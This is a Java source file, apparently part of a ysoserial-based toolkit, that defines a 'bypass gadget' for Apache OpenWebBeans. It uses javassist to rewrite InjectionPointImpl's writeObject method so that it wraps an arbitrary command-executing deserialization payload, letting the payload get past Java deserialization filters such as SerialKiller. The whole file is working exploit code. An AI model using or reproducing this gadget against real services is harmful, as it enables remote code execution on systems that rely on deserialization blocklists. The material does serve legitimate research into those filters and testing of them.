package serialkiller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.webbeans.component.InjectionPointBean;
import ysoserial.payloads.annotation.Dependencies;

import javax.enterprise.inject.spi.Bean;
import java.lang.reflect.Constructor;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "org.apache.openwebbeans:openwebbeans-impl:1.6.3" })
public class ApacheWebBeans1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("org.apache.webbeans.inject.impl.InjectionPointImpl");
        CtMethod writeObject = c.getDeclaredMethod("writeObject");
        String code = "{" +
                "java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream($1);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "oos.writeObject(payload);" +
                "oos.flush();" +
                "}";
        writeObject.setBody(code);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getDeclaredConstructor(Bean.class);
        ctor.setAccessible(true);
        return ctor.newInstance(new Object[]{new InjectionPointBean(null)});

    }

    public boolean bypassXStream() { return false; }
    public boolean skipTest() { return false; }
}
